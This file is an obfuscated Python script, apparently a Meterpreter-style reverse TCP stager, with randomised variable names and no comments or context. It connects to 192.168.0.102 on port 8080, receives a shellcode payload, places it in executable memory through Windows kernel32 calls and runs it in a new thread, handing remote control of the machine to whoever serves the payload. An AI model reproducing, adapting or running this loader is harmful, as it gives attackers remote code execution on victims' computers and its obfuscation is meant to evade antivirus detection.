import struct, socket, binascii, ctypes as fzeGWFkTTcJdpc, random, time
UxcJoQzKitHs, aLZszgml = None, None
def eMLVpAPsIl():
	try:
		global aLZszgml
		aLZszgml = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		aLZszgml.connect(('192.168.0.102', 8080))
		MhzeNRpQ = struct.pack('<i', aLZszgml.fileno())
		l = struct.unpack('<i', aLZszgml.recv(4))[0]
		vReyPyvtNSVaF = b"     "
		while len(vReyPyvtNSVaF) < l: vReyPyvtNSVaF += aLZszgml.recv(l)
		QCCisPEYdITCVfc = fzeGWFkTTcJdpc.create_string_buffer(vReyPyvtNSVaF, len(vReyPyvtNSVaF))
		QCCisPEYdITCVfc[0] = binascii.unhexlify('BF')
		for i in range(4): QCCisPEYdITCVfc[i+1] = MhzeNRpQ[i]
		return QCCisPEYdITCVfc
	except: return None
def yRpNeh(JPGBdgNt):
	if JPGBdgNt != None:
		gmhSqMTlYZJkiAj = bytearray(JPGBdgNt)
		qEjPjkZADCn = fzeGWFkTTcJdpc.windll.kernel32.VirtualAlloc(fzeGWFkTTcJdpc.c_int(0),fzeGWFkTTcJdpc.c_int(len(gmhSqMTlYZJkiAj)),fzeGWFkTTcJdpc.c_int(0x3000),fzeGWFkTTcJdpc.c_int(0x40))
		oCVcVAEV = (fzeGWFkTTcJdpc.c_char * len(gmhSqMTlYZJkiAj)).from_buffer(gmhSqMTlYZJkiAj)
		fzeGWFkTTcJdpc.windll.kernel32.RtlMoveMemory(fzeGWFkTTcJdpc.c_int(qEjPjkZADCn), oCVcVAEV, fzeGWFkTTcJdpc.c_int(len(gmhSqMTlYZJkiAj)))
		ht = fzeGWFkTTcJdpc.windll.kernel32.CreateThread(fzeGWFkTTcJdpc.c_int(0),fzeGWFkTTcJdpc.c_int(0),fzeGWFkTTcJdpc.c_int(qEjPjkZADCn),fzeGWFkTTcJdpc.c_int(0),fzeGWFkTTcJdpc.c_int(0),fzeGWFkTTcJdpc.pointer(fzeGWFkTTcJdpc.c_int(0)))
		fzeGWFkTTcJdpc.windll.kernel32.WaitForSingleObject(fzeGWFkTTcJdpc.c_int(ht),fzeGWFkTTcJdpc.c_int(-1))
UxcJoQzKitHs = eMLVpAPsIl()
yRpNeh(UxcJoQzKitHs)
